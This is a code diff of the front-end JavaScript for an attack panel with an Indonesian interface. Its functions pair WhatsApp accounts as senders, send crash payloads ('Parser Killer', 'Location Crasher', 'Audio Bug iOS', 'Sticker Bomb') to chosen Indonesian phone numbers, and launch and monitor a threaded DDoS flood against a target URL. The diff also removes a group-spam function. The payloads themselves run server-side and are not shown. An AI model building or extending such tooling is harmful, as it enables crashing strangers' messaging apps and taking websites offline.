@@ -1,6 +1,6 @@
 const socket = io();
 let currentUser = null;
-let selectedSender = 'private';
+let selectedSenderBug = 'private';
 
 async function api(path, opts = {}) {
   const r = await fetch('/api' + path, {
@@ -36,7 +36,6 @@ function closeModal() {
   document.getElementById('customModal').classList.remove('show');
 }
 
-/* THEME */
 function toggleTheme() {
   const isDark = document.getElementById('darkModeToggle').checked;
   if (isDark) {
@@ -65,7 +64,7 @@ function showPage(id) {
 function router() {
   if (!currentUser) return showPage('login');
   const hash = (location.hash || '#chat').slice(1);
-  const validBase = ['chat','pairing','bug','bangrup','tools','notes','admin','settings'];
+  const validBase = ['chat','pairing','bug','tools','notes','admin','settings'];
   const rootPath = hash.split('/')[0];
   const view = validBase.includes(rootPath) ? rootPath : 'chat';
 
@@ -75,8 +74,8 @@ function router() {
   if (view === 'admin') loadUsers();
   if (view === 'notes') loadNotes();
   if (view === 'settings') loadProfile();
-  if (view === 'bug') {
-    loadBugProfile();
+  
+  if (view === 'bug' || view === 'bug/xyrex') {
     loadSenderStatus();
   }
 }
@@ -127,73 +126,47 @@ function loadProfile() {
   document.querySelector('.profile-avatar').textContent = currentUser.username.charAt(0).toUpperCase();
 }
 
-function loadBugProfile() {
-  if (!currentUser) return;
-  document.getElementById('bugProfileName').textContent = currentUser.username;
-  document.getElementById('bugProfileRole').textContent = currentUser.role.toUpperCase();
-}
-
-function switchBugTab(tab) {
-  document.querySelectorAll('.bug-tab').forEach(t => t.classList.remove('active'));
-  document.querySelectorAll('.bug-content').forEach(c => c.classList.add('hidden'));
-  
-  if (tab === 'nomor') {
-    document.querySelectorAll('.bug-tab')[0].classList.add('active');
-    document.getElementById('tabBugNomor').classList.remove('hidden');
-    document.getElementById('tabBugNomor').classList.add('active');
-  } else {
-    document.querySelectorAll('.bug-tab')[1].classList.add('active');
-    document.getElementById('tabBugGroup').classList.remove('hidden');
-  }
-}
-
-function toggleBugAccordion() {
-  const body = document.getElementById('bugAccordionBody');
-  const arrow = document.getElementById('bugArrow');
-  if (body.classList.contains('open')) {
-    body.classList.remove('open');
-    arrow.style.transform = 'rotate(0deg)';
-  } else {
-    body.classList.add('open');
-    arrow.style.transform = 'rotate(180deg)';
-  }
+function selectBugType(element, type) {
+  document.querySelectorAll('.bug-type-card').forEach(card => card.classList.remove('active'));
+  element.classList.add('active');
+  document.getElementById('selectedBugType').value = type;
 }
 
 async function loadSenderStatus() {
   const r = await api('/pairing/status');
-  const globalCount = r.ok ? (r.globalSenders || 0) : 0;
+  if (!r.ok) return;
   
-  document.getElementById('globalCount').textContent = globalCount;
+  const globalCount = r.globalSenders || 0;
+  
+  const gCount = document.getElementById('globalCount');
+  if (gCount) gCount.textContent = globalCount;
 
   const boxGlobal = document.getElementById('boxGlobal');
-  const boxPrivate = document.getElementById('boxPrivate');
-
-  if (globalCount === 0) {
-    boxGlobal.classList.add('disabled');
-    boxGlobal.onclick = null;
-  } else {
-    boxGlobal.classList.remove('disabled');
-    boxGlobal.onclick = () => selectSender('global');
+  if (boxGlobal) {
+    if (globalCount === 0) boxGlobal.classList.add('disabled');
+    else boxGlobal.classList.remove('disabled');
   }
 }
 
 function selectSender(type) {
   if (type === 'global') {
     const boxGlobal = document.getElementById('boxGlobal');
-    if (boxGlobal.classList.contains('disabled')) return;
+    if (boxGlobal && boxGlobal.classList.contains('disabled')) return;
   }
-
-  selectedSender = type;
+  
+  selectedSenderBug = type;
   
   const boxGlobal = document.getElementById('boxGlobal');
   const boxPrivate = document.getElementById('boxPrivate');
-
-  if (type === 'global') {
-    boxGlobal.classList.add('active');
-    boxPrivate.classList.remove('active');
-  } else {
-    boxPrivate.classList.add('active');
-    boxGlobal.classList.remove('active');
+  
+  if (boxGlobal && boxPrivate) {
+    if (type === 'global') {
+      boxGlobal.classList.add('active');
+      boxPrivate.classList.remove('active');
+    } else {
+      boxPrivate.classList.add('active');
+      boxGlobal.classList.remove('active');
+    }
   }
 }
 
@@ -268,41 +241,62 @@ async function startPairing() {
 }
 
 async function requestCode() {
-  const phone = document.getElementById('pairPhone').value.trim();
+  const phoneInput = document.getElementById('pairPhone').value.trim();
+  const box = document.getElementById('pairCodeBox');
+  
+  let phone = phoneInput.replace(/[^0-9]/g, '');
+  if (phone.startsWith('0')) phone = '62' + phone.slice(1);
+  
+  if (phone.length < 10) {
+    return customAlert('Nomor Salah', 'Masukkan nomor yang valid (contoh: 6285189045832).');
+  }
+
+  box.textContent = 'Meminta kode (tunggu 3 detik)...';
   const r = await api('/pairing/code', { method: 'POST', body: { phone } });
-  document.getElementById('pairCodeBox').textContent = JSON.stringify(r, null, 2);
+  
+  if (!r.ok) {
+    box.textContent = 'Gagal.';
+    return customAlert('Gagal Pairing', r.msg);
+  }
+  
+  box.textContent = `Pairing Code: ${r.code}\n\nMasukkan kode ini di WhatsApp > Perangkat Tertaut > Tautkan dengan Nomor Telepon.`;
 }
 
 async function sendBug() {
   const target = document.getElementById('bugTarget').value.trim();
-  const type = document.querySelector('input[name="bugType"]:checked').value;
-  const out = document.getElementById('bugOut');
+  const type = document.getElementById('selectedBugType').value;
+  const btn = document.querySelector('button[onclick="sendBug()"]');
 
   if (!target.startsWith('62') && !target.startsWith('+62')) {
     return customAlert('Nomor Tidak Valid', 'Gunakan format +62...');
   }
 
-  out.textContent = 'Mengirim payload...';
-  const r = await api('/bug/send', { method: 'POST', body: { target, type, senderType: selectedSender } });
+  const originalText = btn.innerHTML;
+  btn.disabled = true;
   
+  let dots = 0;
+  const loadingInterval = setInterval(() => {
+    dots = (dots + 1) % 4;
+    btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:20px;height:20px;margin-right:8px;"><circle cx="12" cy="12" r="10"></circle><path d="M12 6v6l4 2"></path></svg> Memproses${'.'.repeat(dots)}`;
+  }, 300);
+
+  const r = await api('/bug/send', { method: 'POST', body: { target, type, senderType: selectedSenderBug } });
+  
+  clearInterval(loadingInterval);
+  btn.disabled = false;
+  btn.innerHTML = originalText;
+
   if (!r.ok) {
-    out.textContent = 'Gagal.';
     return customAlert('Gagal Mengirim', r.msg);
   }
-  out.textContent = JSON.stringify(r, null, 2);
-}
-
-async function spamGroup() {
-  const groupLink = document.getElementById('groupLink').value.trim();
-  const count = +document.getElementById('groupCount').value;
-  const out = document.getElementById('groupOut');
   
-  if (!groupLink.includes('chat.whatsapp.com')) return customAlert('Link Salah', 'Pastikan link grup WhatsApp.');
+  let infoPesan = '';
+  if (type === 'foreclose') infoPesan = 'Payload Parser Killer berhasil dikirim!';
+  else if (type === 'crash') infoPesan = 'Exploit Location Crasher berhasil dikirim!';
+  else if (type === 'crashios') infoPesan = 'Audio Bug iOS berhasil dikirim!';
+  else if (type === 'delay') infoPesan = 'Sticker Bomb berhasil dikirim!';
 
-  out.textContent = 'Memproses...';
-  const r = await api('/bangrup/spam', { method: 'POST', body: { groupLink, count } });
-  if (!r.ok) { out.textContent = 'Gagal.'; return customAlert('Gagal', r.msg); }
-  out.textContent = JSON.stringify(r, null, 2);
+  customAlert('Serangan Dimulai', `Bug tipe ${type.toUpperCase()} berhasil dikirim ke ${target}.\n\n${infoPesan}`);
 }
 
 async function toolVideo() {
@@ -321,9 +315,12 @@ async function toolVideo() {
     resultBox.classList.remove('hidden');
     document.getElementById('videoTitle').textContent = r.result.title;
     document.getElementById('videoPlayer').src = r.result.video;
+    
     const dl = document.getElementById('videoDownloadBtn');
-    dl.href = r.result.video;
-    dl.setAttribute('download', 'video.mp4');
+    const safeTitle = (r.result.title || 'video').replace(/[^a-z0-9]/gi, '_').substring(0, 20);
+    dl.href = `/api/tools/download?url=${encodeURIComponent(r.result.video)}&filename=${safeTitle}.mp4`;
+    dl.removeAttribute('target');
+    dl.removeAttribute('download');
   } else { out.textContent = JSON.stringify(r, null, 2); }
 }
 
@@ -380,31 +377,73 @@ async function toolScan() {
 }
 
 async function startDdos() {
-  const target = document.getElementById('ddosTarget').value.trim();
+  let target = document.getElementById('ddosTarget').value.trim();
   const duration = +document.getElementById('ddosDur').value;
   const threads = +document.getElementById('ddosThr').value;
-  if (!target) return customAlert('Kosong', 'Isi target.');
+  
+  target = target.replace(/[, ]+$/, "");
+
+  if (!target) return customAlert('Target Kosong', 'Isi URL target terlebih dahulu.');
+  if (!target.startsWith('http://') && !target.startsWith('https://')) {
+    return customAlert('URL Salah', 'URL harus diawali http:// atau https://');
+  }
+
+  if (duration > 120) return customAlert('Batas Maksimal', 'Durasi maksimal adalah 120 detik.');
+  if (threads > 200) return customAlert('Batas Maksimal', 'Threads maksimal adalah 200.');
+
   document.getElementById('btnStartDdos').disabled = true;
-  document.getElementById('ddosOut').textContent = 'Menyiapkan...';
+  document.getElementById('ddosOut').classList.remove('hidden');
+  
+  document.getElementById('statSent').textContent = '0';
+  document.getElementById('statRps').textContent = '0.0';
+  document.getElementById('statElapsed').textContent = '0s';
+  document.getElementById('statOk').textContent = '0';
+  document.getElementById('statErr').textContent = '0';
+  document.getElementById('statHeld').textContent = '0';
+  document.getElementById('ddosProgress').style.width = '0%';
+  document.getElementById('ddosProgress').textContent = '0%';
+  document.getElementById('statStatus').textContent = 'Menyiapkan serangan...';
+  
   const r = await api('/tools/ddos', { method: 'POST', body: { target, duration, threads } });
-  if (!r.ok) { document.getElementById('btnStartDdos').disabled = false; document.getElementById('ddosOut').textContent = r.msg; }
+  if (!r.ok) {
+    document.getElementById('btnStartDdos').disabled = false;
+    document.getElementById('statStatus').textContent = 'Gagal: ' + r.msg;
+    return customAlert('Gagal Memulai', r.msg);
+  }
 }
 
+socket.off('ddos:stats'); 
+socket.on('ddos:stats', s => {
+  const elapsedSec = (Date.now() - s.startedAt) / 1000;
+  const rps = elapsedSec > 0 ? (s.requests / elapsedSec).toFixed(1) : '0.0';
+  const dur = +document.getElementById('ddosDur').value || 60;
+  let percent = Math.min((elapsedSec / dur) * 100, 100).toFixed(0);
+  
+  document.getElementById('statSent').textContent = s.requests;
+  document.getElementById('statRps').textContent = rps;
+  document.getElementById('statElapsed').textContent = Math.floor(elapsedSec) + 's';
+  document.getElementById('statOk').textContent = s.success;
+  document.getElementById('statErr').textContent = s.failed;
+  document.getElementById('statHeld').textContent = s.activeSockets || 0;
+  
+  document.getElementById('ddosProgress').style.width = percent + '%';
+  document.getElementById('ddosProgress').textContent = percent + '%';
+  document.getElementById('statStatus').textContent = 'Menunggu response...';
+});
+
+socket.off('ddos:done');
+socket.on('ddos:done', s => {
+  document.getElementById('btnStartDdos').disabled = false;
+  document.getElementById('statStatus').textContent = '[DONE] Serangan Selesai.';
+  document.getElementById('ddosProgress').style.width = '100%';
+  document.getElementById('ddosProgress').textContent = '100%';
+});
+
 async function stopDdos() {
-  document.getElementById('ddosOut').textContent = 'Menghentikan...';
+  document.getElementById('statStatus').textContent = 'Menghentikan...';
   const r = await api('/tools/ddos/stop', { method: 'POST' });
   if (!r.ok) customAlert('Gagal Stop', r.msg);
 }
-
-socket.on('ddos:stats', s => {
-  const el = document.getElementById('ddosOut');
-  if (el) el.textContent = `FLOODING\nReq: ${s.requests}\nHeld: ${s.activeSockets || 0}\nElapsed: ${((Date.now()-s.startedAt)/1000).toFixed(1)}s`;
-});
-socket.on('ddos:done', s => {
-  const el = document.getElementById('ddosOut');
-  document.getElementById('btnStartDdos').disabled = false;
-  if (el) el.textContent += `\n\n[DONE] Selesai.`;
-});
 
 async function addNote() {
   const text = document.getElementById('noteText').value.trim();
